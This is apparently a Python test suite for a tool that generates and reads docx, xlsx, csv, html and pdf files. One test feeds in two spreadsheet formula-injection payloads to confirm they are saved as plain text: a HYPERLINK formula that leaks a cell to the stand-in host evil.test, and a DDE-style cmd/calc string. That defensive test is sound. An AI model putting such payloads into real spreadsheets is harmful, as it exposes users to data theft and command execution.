import json
import zipfile

import pytest

from orion.tools.documents import MAX_ARQUIVO, TIPOS_GERACAO, document_tools


@pytest.fixture
def docs():
    return {t.name: t for t in document_tools()}


def roda(tool, **args):
    return json.loads(tool.run(args))


# ── gerar + ler (ida e volta com as bibliotecas de verdade) ───────────────────
def test_docx_gerado_abre_no_python_docx_e_volta_pelo_leitor(docs, tmp_path):
    caminho = tmp_path / "relatorio.docx"
    conteudo = (
        "## Resumo\nTexto normal\n- item um\n- item dois\n1. primeiro\n### Detalhe\n#### Fino"
    )
    r = roda(
        docs["gerar_documento"],
        tipo="docx",
        conteudo=conteudo,
        path=str(caminho),
        titulo="Meu relatório",
    )
    assert r["ok"] and r["bytes"] > 1000
    from docx import Document

    paragrafos = [(p.style.name, p.text) for p in Document(str(caminho)).paragraphs]
    assert paragrafos[0] == ("Title", "Meu relatório")
    assert ("Heading 1", "Resumo") in paragrafos and ("List Bullet", "item um") in paragrafos
    assert ("List Number", "primeiro") in paragrafos and ("Heading 2", "Detalhe") in paragrafos
    lido = roda(docs["ler_documento"], path=str(caminho))
    assert lido["ok"] and lido["tipo"] == "docx" and "Texto normal" in lido["conteudo"]


def test_xlsx_nao_grava_formula_mesmo_que_o_texto_comece_com_igual(docs, tmp_path):
    caminho = tmp_path / "planilha.xlsx"
    perigoso = '=HYPERLINK("http://evil.test/?x="&A1,"clique")'
    dados = json.dumps([["Nome", "Valor"], ["Café", 3.5], [perigoso, "+cmd|' /C calc'!A0"]])
    assert roda(
        docs["gerar_documento"], tipo="xlsx", conteudo=dados, path=str(caminho), titulo="Gastos"
    )["ok"]
    from openpyxl import load_workbook

    ws = load_workbook(str(caminho)).active
    assert ws.title == "Gastos" and ws["A2"].value == "Café"
    assert ws["A3"].value == perigoso and ws["A3"].data_type == "s"  # texto, não "f" (fórmula)
    assert ws["B3"].data_type == "s"
    lido = roda(docs["ler_documento"], path=str(caminho))
    assert "Café\t3" in lido["conteudo"] and "## Gastos" in lido["conteudo"]


def test_xlsx_a_partir_de_texto_com_ponto_e_virgula_e_nome_de_aba_invalido(docs, tmp_path):
    caminho = tmp_path / "t.xlsx"
    assert roda(
        docs["gerar_documento"],
        tipo="xlsx",
        conteudo="a;b\n1;2",
        path=str(caminho),
        titulo="x/y:z[1]",
    )["ok"]
    from openpyxl import load_workbook

    ws = load_workbook(str(caminho)).active
    assert [c.value for c in ws[2]] == ["1", "2"] and ws.title == "x_y_z_1_"


def test_csv_txt_md_html_e_extensao_corrigida(docs, tmp_path):
    csv_ = roda(
        docs["gerar_documento"],
        tipo="csv",
        conteudo='[["a","b,c"],["1","2"]]',
        path=str(tmp_path / "d"),
    )
    assert csv_["path"].endswith("d.csv")
    assert (tmp_path / "d.csv").read_text(encoding="utf-8").splitlines() == ['a,"b,c"', "1,2"]
    roda(docs["gerar_documento"], tipo="md", conteudo="# t", path=str(tmp_path / "n.md"))
    assert (tmp_path / "n.md").read_text() == "# t"
    roda(
        docs["gerar_documento"],
        tipo="html",
        conteudo="<p>oi</p>",
        path=str(tmp_path / "p.html"),
        titulo="A<B",
    )
    html = (tmp_path / "p.html").read_text(encoding="utf-8")
    assert "<title>A&lt;B</title>" in html and "<p>oi</p>" in html
    lido = roda(docs["ler_documento"], path=str(tmp_path / "p.html"))
    assert lido["conteudo"] == "oi"


def test_pdf_gerado_e_lido_com_reportlab_e_pypdf(docs, tmp_path):
    pytest.importorskip("reportlab")
    caminho = tmp_path / "doc.pdf"
    r = roda(
        docs["gerar_documento"],
        tipo="pdf",
        conteudo="# Título\nLinha com <b>tag</b> & símbolo",
        path=str(caminho),
        titulo="Doc",
    )
    assert r["ok"]
    lido = roda(docs["ler_documento"], path=str(caminho))
    assert (
        "Título" in lido["conteudo"] and "<b>tag</b>" in lido["conteudo"]
    )  # escapado, não interpretado


# ── limites e erros ───────────────────────────────────────────────────────────
def test_ler_recusa_extensao_ausente_enorme_e_corrompido(docs, tmp_path):
    assert "não encontrado" in roda(docs["ler_documento"], path=str(tmp_path / "x.txt"))["erro"]
    (tmp_path / "a.exe").write_bytes(b"MZ")
    assert "não suportada" in roda(docs["ler_documento"], path=str(tmp_path / "a.exe"))["erro"]
    (tmp_path / "ruim.docx").write_bytes(b"isto nao e um zip")
    assert (
        "não consegui ler" in roda(docs["ler_documento"], path=str(tmp_path / "ruim.docx"))["erro"]
    )
    (tmp_path / "ruim.pdf").write_bytes(b"%PDF-quebrado")
    assert (
        "não consegui ler" in roda(docs["ler_documento"], path=str(tmp_path / "ruim.pdf"))["erro"]
    )
    grande = tmp_path / "g.txt"
    with grande.open("wb") as f:
        f.truncate(MAX_ARQUIVO + 1)
    assert "MB" in roda(docs["ler_documento"], path=str(grande))["erro"]


def test_ler_corta_no_limite_pedido(docs, tmp_path):
    (tmp_path / "l.txt").write_text("palavra " * 1000, encoding="utf-8")
    r = roda(docs["ler_documento"], path=str(tmp_path / "l.txt"), max_chars=500)
    assert len(r["conteudo"]) == 500 and r["truncado"] and r["caracteres"] > 7000


def test_gerar_recusa_tipo_pasta_e_conteudo_enorme(docs, tmp_path):
    assert (
        "tipo inválido"
        in roda(docs["gerar_documento"], tipo="exe", conteudo="x", path=str(tmp_path / "a"))["erro"]
    )
    assert (
        "é uma pasta"
        in roda(docs["gerar_documento"], tipo="txt", conteudo="x", path=str(tmp_path))["erro"]
    )
    assert not tmp_path.with_name(tmp_path.name + ".txt").exists()  # não cria um irmão da pasta
    assert (
        "grande demais"
        in roda(
            docs["gerar_documento"],
            tipo="txt",
            conteudo="x" * (MAX_ARQUIVO // 5 + 1),
            path=str(tmp_path / "b"),
        )["erro"]
    )
    assert set(TIPOS_GERACAO) == {"txt", "md", "html", "csv", "docx", "xlsx", "pdf"}


def test_docx_com_tabela_tem_as_celulas_lidas(docs, tmp_path):
    from docx import Document

    d = Document()
    t = d.add_table(rows=2, cols=2)
    for i, v in enumerate(["a", "b", "c", "d"]):
        t.cell(i // 2, i % 2).text = v
    d.save(str(tmp_path / "t.docx"))
    assert "a\tb\nc\td" in roda(docs["ler_documento"], path=str(tmp_path / "t.docx"))["conteudo"]


def test_zip_de_docx_valido_tem_a_estrutura_minima(docs, tmp_path):
    caminho = tmp_path / "z.docx"
    roda(docs["gerar_documento"], tipo="docx", conteudo="oi", path=str(caminho))
    with zipfile.ZipFile(caminho) as z:
        assert {"[Content_Types].xml", "word/document.xml"} <= set(z.namelist())
